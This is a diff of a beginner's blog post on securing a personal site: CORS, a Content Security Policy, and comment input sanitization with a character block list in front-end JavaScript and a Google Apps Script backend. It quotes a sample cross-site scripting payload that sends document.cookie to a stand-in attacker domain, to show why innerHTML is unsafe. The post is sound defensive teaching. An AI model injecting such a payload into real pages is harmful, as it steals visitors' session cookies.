@@ -30,183 +30,96 @@
           </ul>
         </div>
       </div>
-    </nav>
-
-    <div class="card card-body mb-3 mt-3">
-      <h1>My first steps in cybersecurity</h1>
-      <p>Cybersecurity. It might not be flashy, but if some noob hackers manage to break in, where does that leave my credibility?</p>
-      
-      <p>My first concerns ended up been:</p>
-
-      <ul>
-        <li><strong>CORS</strong> Cross-Origin Resource</li>
-        <li><strong>CSP</strong> Content Security Policy</li>
-        <li><strong>Input Sanitization (Front-end)</strong> user input Control on the front-end</li>
-        <li><strong>Input Sanitization (Back-end)</strong>  user input Control on the back-end</li>
-      </ul>
-    </div>
-
-    <div class="card card-body mb-3 mt-3">
-        <h2>Cross-Origin Resource Sharing (CORS)</h2>
-        <p>CORS, in a nutshell, refers to a set of header settings that a server uses to tell a browser which origins are allowed to load its resources.</p>
-        <p>For example, if a domain like randomDomain.net tries to access a server's API, but the server’s CORS policy only allows SpecificDomain.net, the user’s browser will block the request.</p>
-        <p>This was a concern for my API server. The idea was to configure CORS so that only my domain could access my API endpoints. However, since I’m using Google Apps Script as my API server—and Google enforces its own CORS policies that I can’t modify—there wasn’t much I could do.</p>
-        <p>My domain couldn’t even make POST requests—only GET—because Google’s CORS restrictions blocked them. I explained how I worked around this issue in the <a href="/post2.html">previous post</a>.</p>
-    </div>
-
-    <div class="card card-body mb-3 mt-3">
-        <h2>Content Security Policy (CSP)</h2>
-        <p>CSP is a set of rules that a website sends to a browser, telling it what the site's code is allowed—and not allowed—to do. It acts like a security guard, placing restrictions on the scripts and other resources.</p>
-        <p>At first, it might seem strange to restrict your own code. After all, if you trust your code, why limit it? But the point isn’t to guard against yourself—it’s to protect users in case someone manages to inject malicious code into your site.</p>
-        <p>For my website, the most obvious vulnerability is the comment section (more on that later). If someone were to sneak malicious code into a comment, CSP can help prevent that code from doing serious harm by blocking certain actions—like running inline scripts or sending data to shady domains.</p>
-
-        <p>My CSP:</p>
-        <div class="container">
-            <pre><code>
-/*
-  Content-Security-Policy: 
-    default-src 'self';
-    style-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
-    script-src 'self' https://cdn.jsdelivr.net;
-    font-src 'self' https://fonts.googleapis.com;
-            </code></pre>
-        </div>
-        <ul>
-          <li><code>/*</code> : Instructs to apply the following policies to all domain paths:</li>
-          <li><code>default-src 'self'</code> : By default, all resources should come from the domain server itself.</li>
-          <li><code>style-src ...</code> : Style sheets (e.g., CSS files) should come from the domain server or from the specified domain(s) on the right.</li>
-          <li><code>script-src ...</code> : Script files (e.g., JS files) should come from the domain server or from the specified domain(s) on the right.</li>
-          <li><code>font-src ...</code> : Fonts should come from the domain server or from the specified domain(s) on the right.</li>
-        </ul>
-        <p>Any resources not specified here fall under the default-src rule.</p>
-        <p>Note: cdn.jsdelivr.net is the domain that gives my page the bootstrap framework</p>
-        <p>My first CSP version included only the <code>default-src 'self'</code> policy. As a result, my website loaded only resources from its own domain, blocking other things like Bootstrap.</p>
-        <img class="img-fluid" src="../images/CSP_Violations.png" alt="">
-        <p>Using the developer tools, I was able to see exactly what my browser was blocking and from which domains. After some inspection, I added the important domains to my CSP policies.</p>
-
-    </div>
-
-    <div class="card card-body mb-3 mt-3">
-      <p>In hindsight, maybe blocking characters was overkill. Well, better safe than sorry... but I guess I'll remove this blocking in a future commit.</p>
-      <h2>User Input Sanitization</h2>
-      <p>Your system users may not always write to you with the best intentions. Not only can they send you a mean message, but they might also include a malicious piece of code.</p>
-      <p>Imagine if someone writes a comment on my blog that includes an HTML tag containing JavaScript code. This comment will be displayed as part of my blog page. A browser could potentially interpret that comment as additional front-end code to be executed—and that’s where the danger lies.</p>
-      <p>Take a look at the code below. Note that a comment has been added into a comment section using <code>innerHTML</code> :</p>
-      <pre class="language-javascript"><code>
-const commentSection = document.getElementById("commentSection");
-commentSection.innerHTML += `&lt;div&gt;"${comment}"&lt;/div&gt;`;
-      </code></pre>
-      <p>What if the content of comment is:</p>
-      <pre><code>
-&lt;script&gt;fetch('https://attackerDomain5050.com?c=' + document.cookie)&lt;/script&gt;
-      </code></pre>
-      <p>In this case, any user who accesses a page with this comment risks having their cookies stolen. Since the content is inserted via <code>innerHTML</code>, the browser interprets it as executable front-end code. This is just one example of many possible threats.</p>
-      <p>That is why I now display comments on my page using this approach:</p>
-      <pre class="language-javascript"><code>
-const commentElement = document.createElement("div");
-commentElement.textContent = comment;
-const commentSection = document.getElementById("commentSection");
-commentSection.appendChild(commentElement);
-      </code></pre>
-
-      <p>By using textContent, even if the comment includes code, the browser treats it as plain text—not executable code.</p>
-
-      <p>But that’s not all.</p>
-
-      <p>Maybe I could stop here, but an important concept in security—called redundancy—states that I should implement multiple layers of protection, so that if one outer layer fails, the next one provides backup.</p>
-
-      <p>With that in mind, I’ve decided to block certain characters in the comment form:</p>
-
-      <pre><code>
-< > " ' / \ = ( ) { } [ ] ; : @ & + % # $ `
-      </code></pre>
-
-      <p>You can write them in the name and text area of the form, but when you click "Post," a message will appear saying that your comment or name contains forbidden characters. The frontend will then refuse to send your message to the “database.” Without these characters, it becomes much harder to inject code into the comment section.</p>
-      <pre class="language-javascript"><code>
-// Functio to validade a comment
-function isCommentValid(name, comment) {
-    const forbidden = /[<>"'\/\\=\(\)\{\}\[\];:@&+%#$`]/;
-    return !forbidden.test(name) && !forbidden.test(comment);
-}
-      </code></pre>
-
-      <pre class="language-javascript"><code>
-// Part of my form's send event handler.
-// When a comment is invalid,
-// it hides the "sending" message
-// and shows the "invalid comment" message
-// by changing CSS classes.
-// The return exits the form sending function
-// before it actually sends the message.
-if (!isCommentValid(name, message)){
-        sending.classList.replace("d-block", "d-none");
-        invalidCommentMessage.classList.replace("d-none", "d-block");
-        return;
-}
-      </code></pre>
-
-      <p>Some of these characters are blocked not just for script injection, but also to protect the database itself. I’m using a Google Spreadsheet as a database—it’s public information, and anyone following my blog posts knows about it. To prevent a clever user from submitting a comment that contains a Google Sheets formula (which could tamper with the database), I’m filtering out those characters on the frontend.</p>
-
-      <p>And in case someone bypasses that, I’m also checking for those characters in the API code on the backend.</p>
+    </nav> <div class="card card-body mb-3">  <h1>My first steps in cybersecurity  </h1>  <p class="my-2">Cybersecurity. It might not be flashy, but if some noob hackers manage to break in, where does that leave my credibility?  </p>  <p class="my-2">My first concerns ended up been:  </p>  <ul>   <li>    <strong>CORS    </strong>    Cross-Origin Resource    
+   </li>   <li>    <strong>CSP    </strong>    Content Security Policy    
+   </li>   <li>    <strong>Input Sanitization (Front-end)    </strong>    user input Control on the front-end    
+   </li>   <li>    <strong>Input Sanitization (Back-end)    </strong>    user input Control on the back-end    
+   </li>  </ul>  <small>May 25, 2025  </small> </div> <div class="card card-body mb-3">  <h2>Cross-Origin Resource Sharing (CORS)  </h2>  <p class="my-2">CORS, in a nutshell, refers to a set of header settings that a server uses to tell a browser which origins are allowed to load its resources.  </p>  <p class="my-2">For example, if a domain like randomDomain.net tries to access a server's API, but the server’s CORS policy only allows SpecificDomain.net, the user’s browser will block the request.  </p>  <p class="my-2">This was a concern for my API server. The idea was to configure CORS so that only my domain could access my API endpoints. However, since I’m using Google Apps Script as my API server—and Google enforces its own CORS policies that I can’t modify—there wasn’t much I could do.  </p>  <p class="my-2">My domain couldn’t even make POST requests—only GET—because Google’s CORS restrictions blocked them. I explained how I worked around this issue in the   <a href="/posts/post2   ">    previous post   </a>   .   
+  </p> </div> <div class="card card-body mb-3">  <h2>Content Security Policy (CSP)  </h2>  <p class="my-2">CSP is a set of rules that a website sends to a browser, telling it what the site's code is allowed—and not allowed—to do. It acts like a security guard, placing restrictions on the scripts and other resources.  </p>  <p class="my-2">At first, it might seem strange to restrict your own code. After all, if you trust your code, why limit it? But the point isn’t to guard against yourself—it’s to protect users in case someone manages to inject malicious code into your site.  </p>  <p class="my-2">For my website, the most obvious vulnerability is the comment section (more on that later). If someone were to sneak malicious code into a comment, CSP can help prevent that code from doing serious harm by blocking certain actions—like running inline scripts or sending data to shady domains.  </p>  <p class="my-2">My CSP:  </p>  <pre><code>/*   
+  Content-Security-Policy:   
+    default-src 'self';   
+    style-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;   
+    script-src 'self' https://cdn.jsdelivr.net;   
+    font-src 'self' https://fonts.googleapis.com;   
+  </code></pre>  <ul>   <li>    <code>/*    </code>    : Instructs to apply the following policies to all domain paths:    
+   </li>   <li>    <code>default-src 'self'    </code>    : By default, all resources should come from the domain server itself.    
+   </li>   <li>    <code>style-src ...    </code>    : Style sheets (e.g., CSS files) should come from the domain server or from the specified domain(s) on the right.    
+   </li>   <li>    <code>script-src ...    </code>    : Script files (e.g., JS files) should come from the domain server or from the specified domain(s) on the right.    
+   </li>   <li>    <code>font-src ...    </code>    : Fonts should come from the domain server or from the specified domain(s) on the right.    
+   </li>  </ul>  <p class="my-2">Any resources not specified here fall under the default-src rule.  </p>  <p class="my-2">Note: cdn.jsdelivr.net is the domain that gives my page the bootstrap framework  </p>  <p class="my-2">My first CSP version included only the   <code>default-src 'self'   </code>   policy. As a result, my website loaded only resources from its own domain, blocking other things like Bootstrap.   
+  </p>  <img class="img-fluid rounded" src="../images/CSP_Violations.png  " />  <p class="my-2">Using the developer tools, I was able to see exactly what my browser was blocking and from which domains. After some inspection, I added the important domains to my CSP policies.  </p> </div> <div class="card card-body mb-3">  <p class="my-2">In hindsight, maybe blocking characters was overkill. Well, better safe than sorry... but I guess I'll remove this blocking in a future commit.  </p>  <h2>User Input Sanitization  </h2>  <p class="my-2">Your system users may not always write to you with the best intentions. Not only can they send you a mean message, but they might also include a malicious piece of code.  </p>  <p class="my-2">Imagine if someone writes a comment on my blog that includes an HTML tag containing JavaScript code. This comment will be displayed as part of my blog page. A browser could potentially interpret that comment as additional front-end code to be executed—and that’s where the danger lies.  </p>  <p class="my-2">Take a look at the code below. Note that a comment has been added into a comment section using    <code>innerHTML    </code>   :   
+  </p>  <pre class="language-javascript"><code>const commentSection = document.getElementById("commentSection");   
+commentSection.innerHTML += `&lt;div&gt;"${comment}"&lt;/div&gt;`;   
+  </code></pre>  <p class="my-2">What if the content of comment is:  </p>  <pre><code>&lt;script&gt;fetch('https://attackerDomain5050.com?c=' + document.cookie)&lt;/script&gt;   
+  </code></pre>  <p class="my-2">In this case, any user who accesses a page with this comment risks having their cookies stolen. Since the content is inserted via innerHTML, the browser interprets it as executable front-end code. This is just one example of many possible threats.  </p>  <p class="my-2">That is why I now display comments on my page using this approach:  </p>  <pre class="language-javascript"><code>const commentElement = document.createElement("div");   
+commentElement.textContent = comment;   
+const commentSection = document.getElementById("commentSection");   
+commentSection.appendChild(commentElement);   
+  </code></pre>  <p class="my-2">By using textContent, even if the comment includes code, the browser treats it as plain text—not executable code.  </p>  <p class="my-2">But that’s not all.  </p>  <p class="my-2">Maybe I could stop here, but an important concept in security—called redundancy—states that I should implement multiple layers of protection, so that if one outer layer fails, the next one provides backup.  </p>  <p class="my-2">With that in mind, I’ve decided to block certain characters in the comment form:  </p>  <pre><code>&lt; &gt; " ' / \ = ( ) { } [ ] ; : @ & + % # $ `   
+  </code></pre>  <p class="my-2">You can write them in the name and text area of the form, but when you click "Post," a message will appear saying that your comment or name contains forbidden characters. The frontend will then refuse to send your message to the “database.” Without these characters, it becomes much harder to inject code into the comment section.  </p>  <pre class="language-javascript"><code>// Functio to validade a comment   
+function isCommentValid(name, comment) {   
+ const forbidden = /[&lt;&gt;"'\/\\=\(\)\{\}\[\];:@&+%#$`]/;   
+ return !forbidden.test(name) && !forbidden.test(comment);   
+}   
+  </code></pre>  <pre class="language-javascript"><code>// Part of my form's send event handler.   
+// When a comment is invalid,   
+// it hides the "sending" message   
+// and shows the "invalid comment" message   
+// by changing CSS classes.   
+// The return exits the form sending function   
+// before it actually sends the message.   
+if (!isCommentValid(name, message)){   
+    sending.classList.replace("d-block", "d-none");   
+    invalidCommentMessage.classList.replace("d-none", "d-block");   
+    return;   
+}   
+  </code></pre>  <p class="my-2">Some of these characters are blocked not just for script injection, but also to protect the database itself. I’m using a Google Spreadsheet as a database—it’s public information, and anyone following my blog posts knows about it. To prevent a clever user from submitting a comment that contains a Google Sheets formula (which could tamper with the database), I’m filtering out those characters on the frontend.  </p>  <p class="my-2">And in case someone bypasses that, I’m also checking for those characters in the API code on the backend.  </p>  <p class="my-2">My App Script code for now  </p>  <pre class="language-javascript"><code>function doGet(e) {   
+  // check for new comments mails to add to the spreadSheet   
+  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();   
+  const threads = GmailApp.search('subject:blog_comment is:unread');   
+   
+  const forbiddenChars = /[&lt;&gt;"'\/\\=\(\)\{\}\[\];:@&+%#$`]/;   
     
-      <p>My App Script code for now</p>
-
-      <pre class="language-javascript"><code>
-function doGet(e) {
-  // check for new comments mails to add to the spreadSheet
-  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-  const threads = GmailApp.search('subject:blog_comment is:unread');
-
-  const forbiddenChars = /[<>"'\/\\=\(\)\{\}\[\];:@&+%#$`]/;
-
-  threads.forEach(thread => {
-    const messages = thread.getMessages();
-    messages.forEach(msg => {
-      const name = msg.getFrom().split(' <')[0];
-      const [postId, message] = msg.getPlainBody().split("###end###");
-      // checking and blogcking messages and names with forbidden characters
-      if (!forbiddenChars.test(name) && !forbiddenChars.test(message)){
-        sheet.appendRow([postId, name, message]);
-      }
-    });
-    thread.markRead(); 
-  });
-
-  //returing the data as a json
-  const data = sheet.getDataRange().getValues();
-  const postId = e.parameter['post_id'];
-  const filtered_data = data.filter(row => String(row[0]) === String(postId));
-
-  var jsonData = [];
-  for (var i = 0; i < filtered_data.length; i++) {
-    jsonData.push({
-      PostId: filtered_data[i][0],
-      Name: filtered_data[i][1],
-      Message: filtered_data[i][2]
-    });
-  }
-
-  return ContentService.createTextOutput(JSON.stringify(jsonData))
-    .setMimeType(ContentService.MimeType.JSON);
-  
-}
-
-      </code></pre>
-    
-    </div>
-
-
-    <form class="card card-body mb-3" id="comment-form">
+  threads.forEach(thread =&gt; {   
+    const messages = thread.getMessages();   
+    messages.forEach(msg =&gt; {   
+      const name = msg.getFrom().split(' &lt;')[0];   
+      const [postId, message] = msg.getPlainBody().split("###end###");   
+      // checking and blogcking messages and names with forbidden characters   
+      if (!forbiddenChars.test(name) && !forbiddenChars.test(message)){   
+        sheet.appendRow([postId, name, message]);   
+      }   
+    });   
+    thread.markRead();    
+  });   
+   
+  //returing the data as a json   
+  const data = sheet.getDataRange().getValues();   
+  const postId = e.parameter['post_id'];   
+  const filtered_data = data.filter(row =&gt; String(row[0]) === String(postId));   
+   
+  var jsonData = [];   
+  for (var i = 0; i &lt; filtered_data.length; i++) {   
+    jsonData.push({   
+      PostId: filtered_data[i][0],   
+      Name: filtered_data[i][1],   
+      Message: filtered_data[i][2]   
+    });   
+  }   
+   
+  return ContentService.createTextOutput(JSON.stringify(jsonData))   
+    .setMimeType(ContentService.MimeType.JSON);   
+     
+}   
+  </code></pre> </div> <form class="card card-body mb-3" id="comment-form">
       <h6 class="mb-3 text-muted">Leave a comment</h6>
       <div class="mb-2">
-        <input type="text" name="name" class="form-control form-control-sm border-0 border-bottom rounded-0 bg-transparent" 
-          id="name" placeholder="Name" required>
+        <input type="text" name="name" class="form-control form-control-sm border-0 border-bottom rounded-0 bg-transparent" id="name" placeholder="Name" required="">
       </div>
       <div class="mb-2">
-        <textarea name="message" class="form-control form-control-sm border-0 border-bottom rounded-0 bg-transparent" 
-          id="comment" rows="3" placeholder="Your comment..." required></textarea>
+        <textarea name="message" class="form-control form-control-sm border-0 border-bottom rounded-0 bg-transparent" id="comment" rows="3" placeholder="Your comment..." required=""></textarea>
       </div>
-      <input type="hidden" name="post_id" id="post_id" value="3">
+      <input type="hidden" name="post_id" id="post_id" value="3 ">
       <div class="text-end">
         <button type="submit" class="btn btn-sm btn-outline-secondary">Post</button>
       </div>
